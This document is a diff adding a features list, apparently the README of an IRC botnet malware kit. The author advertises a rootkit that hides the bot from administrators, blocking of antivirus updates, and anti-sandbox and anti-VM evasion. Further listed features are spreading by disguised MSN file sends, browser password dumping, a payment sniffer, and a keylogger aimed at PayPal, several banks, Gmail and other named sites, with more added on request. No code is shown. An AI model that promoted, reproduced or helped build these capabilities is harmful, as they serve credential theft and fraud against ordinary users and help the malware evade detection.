@@ -1,0 +1,56 @@
+Features of my bot:
+
+
+* Can run bot as either an exe or a dll, if dll compile the bot first, then change
+  your exe to byte format with BIN2C.com in `bot2dll` folder. Put byte code into dll.cpp
+  and compile. The exe will inject yout dll into a few process's and will connect to irc.
+  Keep in mind this method is not tested much and may not be stable.
+
+* Dll form rootkit. Rootkit will hide your bot's exe file from the system admin and users.
+  This way you keep your bots for longer because the admin cant find them!
+
+* Av/FireWall update server host changing on install. (Stops AV and Firewall updates)
+* Auto secure computer from many exploits.
+* Anti SandBoxing utility to stop online sandbox's from analyzing your binary.
+* Anti VMWARE, VPC, anubis
+* Anti WPE-Pro [thnks a59 ;)]
+* Persistance
+* Windows Firewall bypass
+
+* MSN unique sendfile. - This is my own msn sendfile, Sends a message you choose from msnsend.cpp 
+  and sends to contact with "email.imageshack.com.zip" with "email.imageshack.com" inside.
+
+* FireFox 1, 2 and 3 password dumping.
+* IE1 to IE7 and credentials/windows storage password dumping.
+* Pass/packet sniffer (Includes online payment sniffer)
+* Keylogger with 2 modes. Normal and Pay. Pay will collect info on specific pay sites
+  while normal will keylog every move.
+
+Keylogger for pay sites includes the following: (Some were requests)
+
+* Paypal.com
+* E-gold.com
+* Moneybookers.com
+* Libertyreserve.com
+* E-Bay.com
+* Rapidshare.com
+* Rapidshare-Premium.com
+* Amazon.com
+* Porn-bb.org
+* Play.com
+* Bendigo Bank
+* HSBC Bank
+* Bank of America
+* lloydstsb.com Bank
+* Citibank.com Bank
+* cPanel 11
+* Warez-bb.org
+* IPB Admin CP (Invision power board)
+* VBulletin Admin CP
+* Direct Admin Login
+* Shop Admins
+* Yahoo
+* Google (Gmail specificly, but can change on request)
+* Msn online server. (MessengerFX.com, ILoveIM.com, eBuddy.com, Meebo.com,
+* Chase Online
+[*] I can add more on request, i will need the URL to see if it's possible.
